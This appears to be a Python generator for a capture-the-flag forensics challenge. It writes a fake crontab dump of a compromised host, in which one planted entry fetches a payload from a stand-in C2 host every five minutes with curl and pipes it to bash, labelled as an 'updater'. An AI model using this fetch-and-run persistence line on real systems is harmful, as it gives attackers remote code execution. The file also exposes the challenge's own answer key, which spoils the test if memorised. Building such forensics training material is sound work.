"""FOR-006 아티팩트 생성기 - 침해 호스트의 crontab 덤프(cron_dump.txt).

정상 cron 항목들 사이에 지속성(persistence)용 악성 항목이 하나 섞여 있다. 5분마다 C2에서
페이로드를 받아 실행하며, 요청에 팀별 동적 implant 토큰이 실려 있다. 조사자는 악성 스케줄과
C2 호스트, 토큰을 찾아야 한다.
"""
import hashlib
import hmac
import os
import sys

CHALLENGE_SECRET = os.environ.get("CHALLENGE_SECRET", "for006-dev-secret")
C2_HOST = "persist.evilcdn.example"
SCHEDULE = "*/5 * * * *"


def dynamic_token(team_id: str) -> str:
    return hmac.new(CHALLENGE_SECRET.encode(), f"FOR-006:{team_id}".encode(), hashlib.sha256).hexdigest()[:14]


def build_cron(team_id: str) -> str:
    token = dynamic_token(team_id)
    lines = [
        "# m h dom mon dow command",
        "0 2 * * * /usr/bin/certbot renew --quiet",
        "*/10 * * * * /opt/app/healthcheck.sh",
        "0 3 * * 0 /usr/bin/find /var/log -mtime +30 -delete",
        f"{SCHEDULE} curl -s http://{C2_HOST}/impl?id={token} | bash   # updater",
        "30 4 * * * /usr/local/bin/backup.sh",
        "@reboot /opt/app/start.sh",
    ]
    return "\n".join(lines) + "\n"


def generate(path: str, team_id: str) -> None:
    with open(path, "w") as f:
        f.write(build_cron(team_id))


if __name__ == "__main__":
    team_id = sys.argv[1] if len(sys.argv) > 1 else "qa_team"
    generate("cron_dump.txt", team_id)
    print(f"생성 완료: cron_dump.txt (team={team_id})")
